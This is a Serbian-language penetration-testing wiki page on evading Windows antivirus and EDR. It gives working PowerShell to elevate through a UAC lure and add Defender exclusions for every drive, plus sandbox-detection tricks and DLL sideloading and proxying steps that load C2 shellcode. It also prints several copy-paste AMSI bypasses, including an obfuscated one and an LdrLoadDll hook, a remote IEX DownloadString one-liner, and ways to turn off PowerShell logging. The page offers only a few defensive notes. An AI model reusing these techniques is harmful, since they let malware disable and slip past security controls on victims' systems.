# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera lažnim predstavljanjem drugog AV-a.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre diranja Defendera

Javno dostupni loaderi koji se predstavljaju kao varalice za igre često se isporučuju kao nepotpisani Node.js/Nexe instaleri koji prvo **traže od korisnika povišene privilegije**, a tek potom onesposobljavaju Defender. Postupak je jednostavan:

1. Proverite da li je kontekst administratorski pomoću `net session`. Komanda uspeva samo kada korisnik koji je pokreće ima administratorska prava, pa neuspeh znači da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite samog sebe uz glagol `RunAs` da bi se prikazao očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „krekovan“ softver, pa obično prihvate upit i tako malveru daju potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Isključenja `MpPreference` za svaki disk

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju Defender-ove slepe tačke umesto da potpuno isključe servis. Loader prvo prekida rad GUI watchdog-a (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka isključenja**, čime svaki korisnički profil, sistemski direktorijum i prenosivi disk postaju nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB stikove itd.), tako da se **svaki budući payload ostavljen bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` je usmereno na budućnost — napadači zadržavaju mogućnost da kasnije učitavaju nepotpisane drajvere bez ponovnog diranja Defendera.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci i dalje aktivni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedna Defender usluga ne zaustavlja, površne provere ispravnosti i dalje prijavljuju „antivirus je aktivan“, iako zaštita u realnom vremenu ne proverava te putanje.<sup>[[26]](#references)</sup>

## **Metodologija izbegavanja AV detekcije**

Trenutno AV-ovi koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu, a kod naprednijih EDR-ova i analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova znakova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam biti potreban neki loader koji će dešifrovati program i pokrenuti ga u memoriji.

- **Obfuskacija**

Ponekad je dovoljno samo da promenite neke nizove znakova u binarnoj datoteci ili skripti kako biste zaobišli AV, ali to može da oduzme mnogo vremena, u zavisnosti od toga šta pokušavate da obfuskirate.

- **Izrada sopstvenih alata**

Ako razvijate sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar način da proverite kako se Windows Defender ponaša pri statičkoj detekciji jeste da koristite [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u suštini deli datoteku na više segmenata i zatim zadaje Defenderu da skenira svaki od njih zasebno. Tako može tačno da vam kaže koji su nizovi znakova ili bajtovi u binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV detekcije.

### **Dinamička analiza**

Dinamička analiza je postupak u kom AV pokreće vašu binarnu datoteku u sandboxu i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a LSASS-a itd.). Ovaj deo može biti malo teži za rešavanje, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandboxe.

- **Sačekajte pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način da zaobiđete dinamičku analizu AV-a. AV-ovi imaju veoma malo vremena za skeniranje datoteka kako ne bi prekidali korisnikov rad, pa duga čekanja mogu da ometu analizu binarnih datoteka. Problem je u tome što mnogi AV sandboxi mogu jednostavno da preskoče čekanje, u zavisnosti od načina na koji je ono implementirano.
- **Provera resursa računara** Sandboxi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. Ovde možete biti i veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — u sandboxu neće biti implementirano baš sve.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu „contoso.local“, možete da proverite domen računara i uporedite ga sa onim koji ste naveli. Ako se ne podudara, možete da podesite da se program zatvori.

Ispostavlja se da je ime računara u sandboxu Microsoft Defendera HAL9TH, pa možete da proverite ime računara u svom malware-u pre detonacije. Ako se ime podudara sa HAL9TH, to znači da ste u Defenderovom sandboxu, pa možete da podesite da se program zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za izbegavanje sandboxa

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovoj objavi, **javni alati** će na kraju **biti otkriveni**, pa treba da se zapitate:

Na primer, ako želite da napravite dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je tačan odgovor ovo drugo. Uzmimo mimikatz za primer: verovatno je to jedan od najčešće označavanih malware alata, ako ne i najčešće označavani, među AV-ovima i EDR-ovima. Iako je sam projekat veoma zanimljiv, zaobilaženje AV-ova pomoću njega predstavlja pravu noćnu moru. Zato potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defenderu i, molim vas, ozbiljno, **NEMOJTE OTPREMITI U VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV otkriva vaš payload, instalirajte ga u VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE fajlovi naspram DLL-ova

Kad god je moguće, uvek **dajte prednost DLL-ovima radi izbegavanja detekcije**. Prema mom iskustvu, DLL datoteke se obično **mnogo ređe otkrivaju i analiziraju**, pa je ovo veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (ako vaš payload, naravno, može da se pokrene kao DLL).

Kao što vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me običnog Havoc EXE payload-a sa običnim Havoc DLL-om</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova koje možete da upotrebite sa DLL datotekama da biste bili mnogo neupadljiviji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL-ova koji koristi loader tako što se ranjiva aplikacija i zlonamerni payload-i smeštaju jedan pored drugog.

Možete da pronađete programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa podložnih DLL hijacking-u unutar direktorijuma "C:\Program Files\\" i DLL datoteka koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe podložne DLL Hijack/Sideload-u**. Ako se pravilno izvede, ova tehnika je prilično prikrivena, ali ako koristite javno poznate programe podložne DLL Sideload-u, lako možete biti otkriveni.

Samo postavljanje zlonamerne DLL datoteke sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar te DLL datoteke. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamerne) DLL datoteke na originalnu DLL datoteku, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t-ov Twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), da biste saznali više o onome o čemu smo razgovarali, detaljnije.

### Zloupotreba prosleđenih eksportova (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo „forwarders“: umesto da pokazuju na kod, eksportni unos sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava eksport, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno ponašanje koje treba razumeti:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs prostora imena (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

Time se omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđeni eksport, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava prema uobičajenom redosledu pretrage.

PoC (kopiraj-nalepi):
1) Kopiraj potpisani sistemski DLL u folder u koji može da se upisuje.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da bi se aktivirao DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Uočeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Zatim loader učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška „missing API“ pojaviće se tek nakon što je `DllMain` već pokrenut

Saveti za pronalaženje:
- Usredsredite se na prosleđene exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Prosleđene exports možete enumerisati alatima kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja van sistemskih direktorijuma, a zatim učitavaju non-KnownDLLs istog osnovnog imena iz tog direktorijuma
- Upozoravajte na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` van sistemskih direktorijuma → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite pravila integriteta koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload namenjen zaobilaženju EDR-ova pomoću suspendovanih procesa, direktnih syscall-ova i alternativnih metoda izvršavanja`

Možete koristiti Freeze da biste učitali i izvršili svoj shellcode na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je igra mačke i miša: ono što funkcioniše danas može biti otkriveno sutra, zato se nikad ne oslanjajte na samo jedan alat; ako je moguće, pokušajte da povežete više tehnika za evasion.

## Direktni/indirektni Syscalls i razrešavanje SSN-a (SysWhispers4)

EDR-ovi često postavljaju **inline hook-ove u user-mode-u** na syscall stub-ove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete da generišete **direktne** ili **indirektne** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovane export ulazne tačke.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: u generisani stub ubacuje instrukciju `syscall`/`sysenter`/`SVC #0` (ne pristupa export-u u `ntdll`).
- **Indirect**: skače na postojeći **syscall gadget** unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za evasion zasnovan na heuristikama); **randomized indirect** bira gadget iz skupa za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disku; pronalazi syscall niz u toku rada.

**Strategije za razrešavanje SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: određuje SSN-ove sortiranjem syscall stub-ova prema virtuelnoj adresi, umesto čitanjem bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu kopiju `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog odeljka `.text`, a zatim je uklanja iz mapiranja (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje određivanje SSN-a sortiranjem po VA sa validacijom opcode-ova kada je stub čist; ako je hook-ovan, koristi određivanje na osnovu VA.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH da u toku rada preuzme SSN iz `EAX`, bez parsiranja hook-ovanih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malware bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV-ovi mogli da skeniraju samo **datoteke na disku**, pa ako bi nekako mogao da izvršiš payload **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u sledeće Windows komponente.

- Kontrola korisničkog naloga, odnosno UAC (podizanje privilegija za EXE, COM, MSI ili instalaciju ActiveX-a)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što im izlaže sadržaj skripti u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje prefiks `amsi:`, a zatim putanju do izvršne datoteke iz koje je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo zapisali nijednu datoteku na disk, ali smo ipak otkriveni u memoriji zbog AMSI-ja.

Štaviše, počev od **.NET 4.8**, C# kod se takođe obrađuje kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuju niže verzije .NET-a (kao što je 4.7.2 ili starija) ako želiš da izbegneš AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto se AMSI uglavnom oslanja na statičku detekciju, izmena skripti koje pokušavaš da učitaš može biti dobar način da izbegneš detekciju.

Međutim, AMSI može da ukloni obfuskaciju sa skripti čak i kada imaju više slojeva, pa obfuskacija može biti loš izbor, u zavisnosti od načina na koji je izvedena. Zbog toga zaobilaženje nije baš jednostavno. Ipak, ponekad je dovoljno da promeniš nekoliko imena promenljivih i sve će biti u redu, pa to zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće ga je lako neovlašćeno menjati, čak i kada se izvršava kao korisnik bez privilegija. Zbog ovog nedostatka u AMSI implementaciji, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Izazivanje neuspeha AMSI inicijalizacije (amsiInitFailed) znači da se za trenutni proces neće pokrenuti skeniranje. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da bi AMSI postao neupotrebljiv u trenutnom PowerShell procesu. Naravno, tu liniju je detektovao sam AMSI, pa je potrebna određena izmena da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno čim objavite ovu objavu, zato nemojte objavljivati nikakav kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Za detaljnije objašnjenje pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon učitavanja `amsi.dll` u trenutni proces. Pouzdan, nezavisan od jezika bypass podrazumeva postavljanje korisničkog hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i taj proces ne obavlja skeniranja.<sup>[[23]](#references)</sup>

Okvirni prikaz implementacije (x64 pseudokod u C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi sa PowerShell, WScript/CScript i custom loader-ima (sa svime što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Primećeno je da ga koriste loader-i koje izvršavaju LOLBins (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skripte za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skripte za zaobilaženje AMSI-ja, koje izbegavaju signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza znakova, kao i nasumične promene veličine slova u PowerShell ključnim rečima.

**Uklonite detektovani signature**

Možete da koristite alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI signature iz memorije trenutnog procesa. Ovaj alat skenira memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite Powershell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete da pokrećete skripte bez njihovog skeniranja pomoću AMSI-ja. To možete da uradite ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) za pokretanje PowerShell-a bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` alata Cobalt Strike). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se ne onemogućavaju automatski AMSI, Script Block Logging niti sve ostale PowerShell odbrane; obuhvat zavisi od runtime okruženja i implementacije host-a.


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation-a oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenjujte šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malvera koji koristi ConfuserEx 2 (ili komercijalne fork-ove), često ćete naići na nekoliko slojeva zaštite koji blokiraju dekompilatore i sandbox-e. Tok rada u nastavku pouzdano **vraća IL koji je gotovo identičan originalu**, a zatim se može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje anti-tampering zaštite – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati pad binarne datoteke. Koristite **AntiTamperKiller** da biste pronašli šifrovane tabele metapodataka, oporavili XOR ključeve i ponovo napravili čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2. Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork-u alata de4dot koji podržava ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih funkcija omotača (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultujući binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload. Često ga malware čuva kao niz bajtova kodiran TLV formatom, inicijalizovan unutar `<Module>.byte_0`.

Ovaj niz koraka vraća tok izvršavanja **bez** potrebe za pokretanjem zlonamernog uzorka – korisno pri radu na offline radnoj stanici.

